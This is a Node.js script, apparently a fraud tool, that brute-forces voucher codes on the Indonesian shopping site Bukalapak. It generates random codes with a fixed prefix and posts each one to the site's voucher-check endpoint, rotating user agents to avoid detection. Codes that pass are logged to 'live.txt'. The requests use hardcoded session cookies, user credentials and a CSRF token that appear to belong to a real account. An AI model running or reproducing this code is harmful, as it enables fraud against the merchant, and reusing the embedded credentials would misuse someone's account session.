const rp = require('request-promise');
const random_ua = require('random-ua');
const randstr = require('randomstring');
const inquirer = require('inquirer');
const fs = require('fs');
//
const base = "BLMOIV";
let length = 4;
//
async function check(code) {
	const option = {
		url: 'https://www.bukalapak.com/payment/purchases/check_voucher.json',
		method: 'POST',
		headers: {
			'Cookie': 'identity=da38cd70e3c4d316fe3445ea8dbac0b4; browser_id=38090cdf5633b85d6ea22615390d1582; session_id=70c0f1dd0b1429ae64bf603d1e3931ff; _ga=GA1.2.1984851215.1539006323; _gid=GA1.2.477495521.1539006323; _vwo_uuid_v2=D74C56778462CFFE9C35DAC31C27A3663|af682a23dceef5d36cf4d78e5b118444; _gcl_au=1.1.518445014.1539006324; __auc=649ae3f516653ed3cfc84135a90; scs=%7B%22t%22%3A1%7D; ins-gaSSId=a30c0a61-4e53-ed80-eb38-1b6306b0aff1_1539009961; ins-mig-done=1; spUID=15390063725462e3b2db0b0.b19b009e; user_credentials=e811fc18f44b79218d9db91591b836eeb17b0d1333a1a3ac3a789ead885752f7f9ac7360ec87fdf8913d7035dbaf7508d5570a5fe746fe69ad279171e7e7f653%3A%3A123375043; mp_51467a440ff602e0c13d513c36387ea8_mixpanel=%7B%22distinct_id%22%3A%20%2221gcsj%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.bukalapak.com%2Fuser_sessions%22%2C%22%24initial_referring_domain%22%3A%20%22www.bukalapak.com%22%7D; G_ENABLED_IDPS=google; keyword_parent_id=; keyword_correlation_id=k7ejff2x5; insdrSV=8; _td=92fdb7da-f2f4-48e9-8d3d-3246fede1573; current-currency=IDR; request_method=POST; lskjfewjrh34ghj23brjh234=V2FFKzhwWHo5Zlo5NUpXS0daSmdUclBDZzFERzRUaC9sLzRyL1RTeEFFdnhScGdIMzJ6WXhCbUpadEV0SnFXbEZ3Vkt6OTFSbng1ZGtEaDUrQURBNlFqZERFV2tzNzRHNVlKa015OTUyRko5U1poMGhTK0dZamE4RHUyY0V2SnRxbC9qdXppWVRjSEM2YllZREhGV043TE92dHF4OXlSTCszQTlhRzZwcGRkL3cvdkZzaFNwS0ZQL3Ftc1lzb2VNd2ZCMVpsYzlZYWNKVWQxck9pbkdRQWhvdCt4SjdPc2V4V2ExTC8vV0ZXRUplZ3doRFppRmFpZHJzSTJVeTZmMzR4S0lTenR5ZXU4bWhQUFFYZk5JWkV6OXFvemVjdEZaZ0h4MGVTRllCcVNpNkxXOGxzWWg5ZmVvdUVaWWprVlJObEVmZ2ZDREtyQkNNT0E3cUtxMUJsOWFjMFBiNmJNa2lFNVh0MDFwYm1GWmZkd3lMWHhYM01HaGlxclJmUUMraDZwR0JXNUF2aTcrM0wwOWhlZm1PSlN2L3ErMVF4K1pETGQ0WmFCa3hRdFhNaTZPb3RiSFFKbjNvR0RVekZEWTdFZTRsalFoa0dOb3ZnRFFuWlJVdWUxdWFZOW5OOFV4ZmFHS2xDRkkrQmVRdmthR0RJblBQcDNOb21SK0dweVNFaFV4b29HR0o1dUlkZ1c5Rzd4b1VaQi9ML2h3TXlXTVJOZDZla21waS9BYmtGclNkLzc3aFRWRDlpMzkycXRXODQyUnFIQjVCN1NLYlZvNFRDbHJNTG5wZS8vWHZuaTlibjM1YUR3RGZ0Yz0tLVVzMmF3Q2lVOU1WdzRxVDZVZUpvQmc9PQ%3D%3D--2843f149780aaa6dae0dbc19bc9286d410a6ff0c; total-cart-amount=0',
			'X-NewRelic-ID': 'VQcDWF9ADgIJVVBQ',
			'Origin': 'https://www.bukalapak.com',
			'X-CSRF-Token': '+S7wDvbCp0Ov+znVU5kF5UEkLwkKoN0n7FDcJRLtwl9qpZS5NLrHxDmkURQDdMh0nM8M1Jb8D/jr82usRx1nXg==',
			'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			'User-Agent': await random_ua.generate(),
			'Content-Type': 'application/json',
			'Accept': '*/*',
			'Referer': 'https://www.bukalapak.com/payment/purchases/new?product_id=759798269&product_sku_id=753364299&seller_ids=%5B48197902%5D',
			'X-Requested-With': 'XMLHttpRequest'
		},
		body: '{"payment_invoice":{"transactions":[{"address":{"province":"","city":""},"amount":450000,"courier_cost":0,"insurance_cost":0,"agent_commission_amount":0,"courier":null,"seller_id":48197902,"retarget_discount_amount":0,"cart_item_ids":[2735899804]}],"payment_method":null,"voucher_amount":0},"payment_details":{"virtual_account_type":""},"voucher_code":"'+code+'"}',
	};
	const start = await rp(option);
	const json = JSON.parse(start);
	return Promise.resolve(json.message);
}

async function generateCode(base, length) {
	return Promise.resolve(base+""+randstr.generate({
		length: length,
		capitalization: 'uppercase'
	}));
}

async function start(base, length, berapakali) {
	for(let i = 0; i < berapakali; i++){
		const kodenya = await generateCode(base, length);
		const checking = await check(kodenya, length);
		if (checking == "Voucher hanya berlaku untuk transaksi di Aplikasi Android Bukalapak dan Aplikasi iOS Bukalapak") {
			fs.appendFileSync('live.txt', `${kodenya} [ ${checking} ]\n`);
		} else {
			fs.appendFileSync('die.txt', `${kodenya} [ ${checking} ]\n`);
		}
		console.log(i+`. ${kodenya} [ ${checking} ]`);
	}
}

console.log(`Bukalapak Voucher Extrap Based.`)

inquirer.prompt([
	{
		type:'input',
		message:'Berapa kali gan? :',
		name:'kalinya',
		validate: function(data) {
			data = data.match(/[0-9]/);
			if (data) return true;
			return 'Only numeric.';
		}
	}
]).then(answers => {
	start(base, length, answers.kalinya);
});